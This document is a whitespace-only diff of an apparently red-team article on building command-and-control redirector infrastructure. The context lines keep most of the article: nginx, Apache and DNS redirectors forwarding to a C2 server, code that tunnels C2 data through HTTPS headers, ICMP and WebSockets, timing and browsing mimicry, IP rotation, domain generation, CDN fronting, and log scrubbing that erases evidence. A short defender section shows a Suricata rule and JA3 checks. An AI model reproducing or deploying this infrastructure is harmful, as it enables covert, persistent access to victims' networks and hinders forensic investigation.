@@ -60,7 +60,7 @@ server {
         proxy_ssl_server_name on;
         proxy_ssl_name actual-c2-server.com;
         proxy_set_header Host actual-c2-server.com;
-        
+
         # Hide original headers
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
@@ -112,7 +112,7 @@ If you prefer Apache, here's how to do the same thing:
     # Redirect specific URI pattern
     ProxyPass /news/api/v1/ https://actual-c2-server.com:443/api/
     ProxyPassReverse /news/api/v1/ https://actual-c2-server.com:443/api/
-    
+
     # Set headers for client tracking
     ProxyPreserveHost Off
     RequestHeader set Host "actual-c2-server.com"
@@ -164,7 +164,7 @@ _data1  IN      TXT     "redirect-to-actual-c2-server-ip"
 This BIND setup makes your redirector the authoritative server for your C2 domain. The zone file defines various records:
 
 - SOA records for admin info
-- NS records for name servers 
+- NS records for name servers
 - A records to map hostnames to IPs
 - TXT records for DNS tunneling
 
@@ -185,10 +185,10 @@ import threading
 def dns_handler(data, client_addr, server_sock):
     request = dnslib.DNSRecord.parse(data)
     domain = str(request.q.qname)
-    
+
     # Log the incoming request
     print(f"Query from {client_addr[0]}: {domain}")
-    
+
     # Forward specific subdomains to the actual C2 server
     if "exfil" in domain or "cmd" in domain:
         # Forward to actual C2 DNS server
@@ -206,9 +206,9 @@ def dns_handler(data, client_addr, server_sock):
 def main():
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     server_sock.bind(("0.0.0.0", 53))
-    
+
     print("DNS redirector running...")
-    
+
     while True:
         data, client_addr = server_sock.recvfrom(1024)
         thread = threading.Thread(target=dns_handler, args=(data, client_addr, server_sock))
@@ -221,7 +221,7 @@ if __name__ == "__main__":
 
 This Python script:
 - Listens for DNS queries on port 53
-- Parses the queries 
+- Parses the queries
 - Looks for special patterns that indicate C2 traffic
 - Forwards those to your actual C2 server
 - Sends normal responses for everything else
@@ -376,14 +376,14 @@ def encapsulate_in_https(c2_data):
         'Referer': 'https://www.google.com/',
         'X-Custom-Data': base64.b64encode(c2_data).decode('utf-8')
     }
-    
+
     # Add randomized legitimate parameters
     params = {
         'id': str(random.randint(10000, 99999)),
         'session': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)),
         'utm_source': random.choice(['google', 'bing', 'facebook', 'twitter'])
     }
-    
+
     return requests.get('https://redirector-domain.com/blog/article', headers=headers, params=params)
 ```
 
@@ -402,7 +402,7 @@ def icmp_tunnel_send(c2_data, target_ip):
     """Send C2 data in ICMP packets"""
     # Split data into chunks to fit in ICMP packets
     chunks = [c2_data[i:i+32] for i in range(0, len(c2_data), 32)]
-    
+
     for i, chunk in enumerate(chunks):
         # Create an ICMP echo request with data in the payload
         packet = IP(dst=target_ip)/ICMP(type=8, seq=i)/Raw(load=chunk)
@@ -416,7 +416,7 @@ def icmp_tunnel_send(c2_data, target_ip):
 // WebSocket-based C2 client
 const establishC2Channel = () => {
     const ws = new WebSocket('wss://legitimate-ws-service.com/socket');
-    
+
     ws.onopen = () => {
         console.log('Connection established');
         // Send initial beacon
@@ -425,7 +425,7 @@ const establishC2Channel = () => {
             data: encodeSystemInfo()
         }));
     };
-    
+
     ws.onmessage = (event) => {
         const message = JSON.parse(event.data);
         // Process commands from the C2 server
@@ -440,7 +440,7 @@ const establishC2Channel = () => {
                 });
         }
     };
-    
+
     // Implement reconnection logic
     ws.onclose = () => {
         setTimeout(establishC2Channel, getJitteredInterval(5000, 30000));
@@ -462,7 +462,7 @@ Here's a simple implementation that mimics how real humans and business hours wo
 def send_c2_traffic(data):
     """Send C2 traffic with realistic timing patterns"""
     chunks = split_into_chunks(data)
-    
+
     for chunk in chunks:
         # Working hours pattern (more traffic during business hours)
         hour = datetime.now().hour
@@ -470,11 +470,11 @@ def send_c2_traffic(data):
             delay = random.uniform(1, 5)  # 1-5 seconds
         else:
             delay = random.uniform(30, 120)  # 30-120 seconds
-            
+
         # Randomize weekends
         if datetime.now().weekday() >= 5:  # Weekend
             delay *= 2
-            
+
         time.sleep(delay)
         send_chunk(chunk)
 ```
@@ -494,7 +494,7 @@ def determine_safe_transfer_volume():
     """Determine safe data transfer volume based on time patterns"""
     hour = datetime.now().hour
     weekday = datetime.now().weekday()
-    
+
     # Base volume (in KB)
     if weekday < 5:  # Weekday
         if 9 <= hour < 12 or 13 <= hour < 17:  # Peak work hours
@@ -514,25 +514,25 @@ def mimic_browser_behavior(session, target_url):
     """Mimic realistic browsing patterns for web-based C2"""
     # First request: main page
     response = session.get(target_url)
-    
+
     # Extract links from the page
     links = extract_links(response.text)
-    
+
     # Visit 2-5 random pages from the site
     for _ in range(random.randint(2, 5)):
         if not links:
             break
-            
+
         # Choose a random link
         next_url = random.choice(links)
         links.remove(next_url)
-        
+
         # Add realistic delay between page visits
         time.sleep(random.uniform(3, 15))
-        
+
         # Visit the page
         session.get(next_url)
-    
+
     # Return to main page occasionally
     if random.random() < 0.3:
         time.sleep(random.uniform(5, 20))
@@ -581,7 +581,7 @@ For maximum security and legitimacy:
 1. **Use trusted certificate authorities**: Let's Encrypt certs are widely trusted and commonly used on legitimate sites.
 
 2. **Create proper certificate parameters**:
-   
+
 ```bash
 # Creating a proper CSR with appropriate parameters
 openssl req -new -sha256 -key domain.key -subj "/C=US/ST=California/L=San Francisco/O=Technology Blog/CN=legitimate-looking-domain.com" -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf "[SAN]\nsubjectAltName=DNS:legitimate-looking-domain.com,DNS:www.legitimate-looking-domain.com")) -out domain.csr
@@ -616,7 +616,7 @@ def check_certificate_transparency_exposure(domain):
     """Check if a domain appears in certificate transparency logs"""
     url = f"https://crt.sh/?q={domain}&output=json"
     response = requests.get(url)
-    
+
     if response.status_code == 200:
         certificates = response.json()
         print(f"Found {len(certificates)} certificates for {domain}")
@@ -639,28 +639,28 @@ import time
 def rotate_redirector_ip():
     """Rotate EC2 instance Elastic IP to avoid blocking"""
     ec2 = boto3.client('ec2')
-    
+
     # Allocate new Elastic IP
     new_ip = ec2.allocate_address(Domain='vpc')
-    
+
     # Get current instance ID
     instances = ec2.describe_instances(
         Filters=[{'Name': 'tag:Role', 'Values': ['redirector']}]
     )
     instance_id = instances['Reservations'][0]['Instances'][0]['InstanceId']
-    
+
     # Associate new IP with instance
     ec2.associate_address(
         InstanceId=instance_id,
         AllocationId=new_ip['AllocationId']
     )
-    
+
     # Update DNS records
     update_dns_records(new_ip['PublicIp'])
-    
+
     # Wait for propagation
     time.sleep(300)
-    
+
     # Release old IP if needed
     old_addresses = ec2.describe_addresses()
     for addr in old_addresses['Addresses']:
@@ -683,19 +683,19 @@ For even better IP rotation:
 def schedule_ip_rotation(ec2_instances, rotation_frequency_hours=72):
     """Schedule regular IP rotation for multiple redirectors"""
     import schedule
-    
+
     # Stagger rotation times to avoid all redirectors changing simultaneously
     for i, instance in enumerate(ec2_instances):
         # Calculate hours offset to stagger rotations
         offset_hours = (i * rotation_frequency_hours) / len(ec2_instances)
         initial_delay = datetime.timedelta(hours=offset_hours)
         next_rotation = datetime.datetime.now() + initial_delay
-        
+
         print(f"Scheduling instance {instance} for first rotation at {next_rotation}")
-        
+
         # Schedule initial rotation
         schedule.every(rotation_frequency_hours).hours.do(rotate_instance_ip, instance_id=instance)
-    
+
     # Run the scheduler
     while True:
         schedule.run_pending()
@@ -708,10 +708,10 @@ def schedule_ip_rotation(ec2_instances, rotation_frequency_hours=72):
 def allocate_ip_in_region(region):
     """Allocate an IP address in a specific AWS region"""
     ec2 = boto3.client('ec2', region_name=region)
-    
+
     # Allocate Elastic IP in the specified region
     allocation = ec2.allocate_address(Domain='vpc')
-    
+
     return {
         'region': region,
         'allocation_id': allocation['AllocationId'],
@@ -738,14 +738,14 @@ def check_ip_reputation(ip_address):
         'ipAddress': ip_address,
         'maxAgeInDays': 90
     }
-    
+
     response = requests.get(url, headers=headers, params=params)
     data = response.json()
-    
+
     if data['data']['abuseConfidenceScore'] > 20:
         print(f"WARNING: IP {ip_address} has a high abuse score: {data['data']['abuseConfidenceScore']}")
         return True
-    
+
     return False
 
 # Check all redirector IPs
@@ -893,7 +893,7 @@ resource "aws_instance" "http_redirector" {
   subnet_id     = aws_subnet.redirector_subnet.id
   vpc_security_group_ids = [aws_security_group.redirector_sg.id]
   key_name      = "redirector-key"
-  
+
   user_data = <<-EOF
               #!/bin/bash
               apt-get update
@@ -912,7 +912,7 @@ resource "aws_instance" "http_redirector" {
               }' > /etc/nginx/sites-available/default
               systemctl restart nginx
               EOF
-  
+
   tags = {
     Name = "HTTP-Redirector"
     Role = "redirector"
@@ -991,13 +991,13 @@ While Terraform excels at provisioning infrastructure, Ansible complements it by
     redirector_domain: "news-updates.com"
     c2_server: "actual-c2-server.com"
     cert_email: "admin@example.com"
-    
+
   tasks:
     - name: Update and upgrade apt packages
       apt:
         upgrade: yes
         update_cache: yes
-        
+
     - name: Install required packages
       apt:
         name:
@@ -1007,19 +1007,19 @@ While Terraform excels at provisioning infrastructure, Ansible complements it by
           - fail2ban
           - ufw
         state: present
-        
+
     - name: Configure Nginx
       template:
         src: templates/nginx.conf.j2
         dest: /etc/nginx/sites-available/default
       notify: Restart Nginx
-      
+
     - name: Configure fail2ban
       template:
         src: templates/jail.local.j2
         dest: /etc/fail2ban/jail.local
       notify: Restart fail2ban
-      
+
     - name: Configure UFW
       ufw:
         rule: allow
@@ -1028,30 +1028,30 @@ While Terraform excels at provisioning infrastructure, Ansible complements it by
       loop:
         - 80
         - 443
-        
+
     - name: Enable UFW
       ufw:
         state: enabled
         policy: deny
-        
+
     - name: Obtain SSL certificate
       shell: >
         certbot --nginx -d {{ redirector_domain }} --non-interactive --agree-tos -m {{ cert_email }}
       args:
         creates: /etc/letsencrypt/live/{{ redirector_domain }}/fullchain.pem
-        
+
     - name: Set up automatic certificate renewal
       cron:
         name: "Certbot renewal"
         job: "certbot renew --quiet --no-self-upgrade"
         special_time: daily
-        
+
   handlers:
     - name: Restart Nginx
       service:
         name: nginx
         state: restarted
-        
+
     - name: Restart fail2ban
       service:
         name: fail2ban
@@ -1115,11 +1115,11 @@ cat > /etc/nginx/conf.d/default.conf << EOL
 server {
     listen 80;
     server_name ${REDIRECTOR_DOMAIN};
-    
+
     location /.well-known/acme-challenge/ {
         root /var/www/certbot;
     }
-    
+
     location / {
         return 301 https://\$host\$request_uri;
     }
@@ -1128,17 +1128,17 @@ server {
 server {
     listen 443 ssl;
     server_name ${REDIRECTOR_DOMAIN};
-    
+
     ssl_certificate /etc/letsencrypt/live/${REDIRECTOR_DOMAIN}/fullchain.pem;
     ssl_certificate_key /etc/letsencrypt/live/${REDIRECTOR_DOMAIN}/privkey.pem;
-    
+
     location ${REDIRECT_PATH} {
         proxy_pass https://${C2_SERVER}${C2_PATH};
         proxy_set_header Host ${C2_SERVER};
         proxy_set_header X-Real-IP \$remote_addr;
         proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
     }
-    
+
     location / {
         root /usr/share/nginx/html;
         index index.html;
@@ -1212,13 +1212,13 @@ A typical Suricata rule for detecting suspicious HTTPS connections might look li
 ```yaml
 # Suricata rule to detect suspicious long-polling HTTPS connections
 alert http $HOME_NET any -> $EXTERNAL_NET any (
-    msg:"Potential C2 channel - Long polling HTTPS"; 
-    flow:established,to_server; 
-    http.method; content:"POST"; 
-    http.header; content:"Content-Type: application/octet-stream"; 
-    tls.cert_subject; content:!"Microsoft Corporation"; content:!"Google LLC"; content:!"Amazon.com"; 
-    detection_filter:track by_src, count 5, seconds 3600; 
-    classtype:trojan-activity; 
+    msg:"Potential C2 channel - Long polling HTTPS";
+    flow:established,to_server;
+    http.method; content:"POST";
+    http.header; content:"Content-Type: application/octet-stream";
+    tls.cert_subject; content:!"Microsoft Corporation"; content:!"Google LLC"; content:!"Amazon.com";
+    detection_filter:track by_src, count 5, seconds 3600;
+    classtype:trojan-activity;
     sid:3000001; rev:1;
 )
 ```
@@ -1246,25 +1246,25 @@ Here's how defenders might analyze these fingerprints:
 def analyze_ssl_fingerprint(pcap_file):
     """Analyze SSL/TLS fingerprints in PCAP to detect C2 redirectors"""
     fingerprints = {}
-    
+
     for packet in read_pcap(pcap_file):
         if packet.haslayer(TLS) and packet.haslayer(TCP):
             # Extract JA3 fingerprint
             ja3 = extract_ja3(packet)
-            
+
             if ja3:
                 if ja3 in fingerprints:
                     fingerprints[ja3] += 1
                 else:
                     fingerprints[ja3] = 1
-    
+
     # Check against known C2 framework fingerprints
     known_c2_ja3 = [
         "e7d705a3286e19ea42f587b344ee6865",  # Cobalt Strike
         "6734f37431670b3ab4292b8f60f29984",  # Metasploit
         "a0e9f5d64349fb13191bc781f81f42e1"   # Empire
     ]
-    
+
     for fp, count in fingerprints.items():
         if fp in known_c2_ja3:
             print(f"Warning: Detected potential C2 SSL fingerprint {fp} (count: {count})")
@@ -1295,24 +1295,24 @@ def generate_domain(seed, date):
     day = date.day
     month = date.month
     year = date.year
-    
+
     # Create a deterministic seed
     domain_seed = seed + str(day) + str(month) + str(year)
-    
+
     # Generate domain components
     import hashlib
     import base64
-    
+
     hash_obj = hashlib.sha256(domain_seed.encode())
     hash_digest = hash_obj.digest()
-    
+
     # Convert to base36 for domain-safe characters
     hash_b36 = base64.b36encode(hash_digest[:10]).decode().lower()
-    
+
     # Add a realistic-looking TLD
     tlds = ['com', 'net', 'org', 'info', 'io']
     tld_index = sum(bytearray(hash_digest[10:11])) % len(tlds)
-    
+
     return f"{hash_b36}.{tlds[tld_index]}"
 ```
 
@@ -1332,7 +1332,7 @@ def setup_cdn_redirector():
     """Setting up a CDN for redirector obfuscation"""
     # Configure CloudFront distribution
     cloudfront = boto3.client('cloudfront')
-    
+
     response = cloudfront.create_distribution(
         DistributionConfig={
             'Origins': {
@@ -1381,7 +1381,7 @@ def setup_cdn_redirector():
             'Comment': 'Legitimate website distribution'
         }
     )
-    
+
     print(f"CDN Distribution created: {response['Distribution']['DomainName']}")
 ```
 
@@ -1414,11 +1414,11 @@ def sanitize_logs():
     # Remove IP addresses
     sed_command = "sed -i 's/[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/REDACTED_IP/g' /var/log/nginx/access.log"
     os.system(sed_command)
-    
+
     # Remove User Agents
     sed_command = "sed -i 's/\"Mozilla\\/[^\"]*\"/\"REDACTED_UA\"/g' /var/log/nginx/access.log"
     os.system(sed_command)
-    
+
     # Remove request URIs containing potential C2 paths
     sed_command = "sed -i 's/GET \\/news\\/api\\/v1\\/[^ ]*/GET \\/news\\/api\\/v1\\/REDACTED_URI/g' /var/log/nginx/access.log"
     os.system(sed_command)
@@ -1442,10 +1442,10 @@ def implement_advanced_logging():
     # Minimal logging configuration
     # Only log critical errors
     *.info;mail.none;authpriv.none;cron.none /var/log/messages
-    
+
     # Discard debug messages
     *.=debug     /dev/null
-    
+
     # Set strict permissions on logs
     $FileOwner root
     $FileGroup adm
@@ -1453,10 +1453,10 @@ def implement_advanced_logging():
     $DirCreateMode 0755
     $Umask 0022
     """
-    
+
     with open('/etc/rsyslog.conf', 'w') as f:
         f.write(rsyslog_conf)
-    
+
     # Set up log rotation with secure deletion
     logrotate_conf = """
     /var/log/nginx/*.log {
@@ -1473,7 +1473,7 @@ def implement_advanced_logging():
         endscript
     }
     """
-    
+
     with open('/etc/logrotate.d/nginx', 'w') as f:
         f.write(logrotate_conf)
 ```
@@ -1493,7 +1493,7 @@ def check_redirector_health():
         ("Firewall Rules", check_firewall_rules),
         ("Suspicious Connections", check_suspicious_connections)
     ]
-    
+
     results = {}
     for check_name, check_func in checks:
         try:
@@ -1501,7 +1501,7 @@ def check_redirector_health():
             results[check_name] = {"status": status, "details": details}
         except Exception as e:
             results[check_name] = {"status": "ERROR", "details": str(e)}
-    
+
     return results
 ```
 
@@ -1519,12 +1519,12 @@ def check_certificate_expiry():
     """Check if SSL certificates are approaching expiration"""
     cmd = "openssl x509 -enddate -noout -in /etc/letsencrypt/live/*/cert.pem"
     output = subprocess.check_output(cmd, shell=True).decode('utf-8')
-    
+
     # Parse expiry date
     expiry_str = output.split('=')[1].strip()
     expiry_date = datetime.strptime(expiry_str, '%b %d %H:%M:%S %Y %Z')
     days_remaining = (expiry_date - datetime.now()).days
-    
+
     if days_remaining < 7:
         return "WARNING", f"Certificate expires in {days_remaining} days"
     return "OK", f"Certificate valid for {days_remaining} days"
@@ -1534,10 +1534,10 @@ def check_suspicious_connections():
     # Get established connections
     cmd = "ss -tuln | grep ESTABLISHED"
     output = subprocess.check_output(cmd, shell=True).decode('utf-8')
-    
+
     # Get list of authorized destinations
     authorized = ['198.51.100.1:443', '203.0.113.1:80']
-    
+
     # Check for unauthorized connections
     unauthorized = []
     for line in output.splitlines():
@@ -1546,7 +1546,7 @@ def check_suspicious_connections():
             dest = parts[4]
             if dest not in authorized:
                 unauthorized.append(dest)
-    
+
     if unauthorized:
         return "WARNING", f"Unauthorized connections: {', '.join(unauthorized)}"
     return "OK", "No suspicious connections detected"
@@ -1656,7 +1656,7 @@ The key takeaways from this article are:
 
 Remember, the most effective redirector strategy is one that's customized for your specific operational context and target environment. The techniques in this article give you a solid foundation, but you should adapt them to your specific needs and the changing threat landscape.
 
-By mastering these redirector techniques, red teams can maintain persistent, stealthy access to target environments while minimizing the risk of detection, ultimately making their security assessments more valuable. 
+By mastering these redirector techniques, red teams can maintain persistent, stealthy access to target environments while minimizing the risk of detection, ultimately making their security assessments more valuable.
 
 ---
 
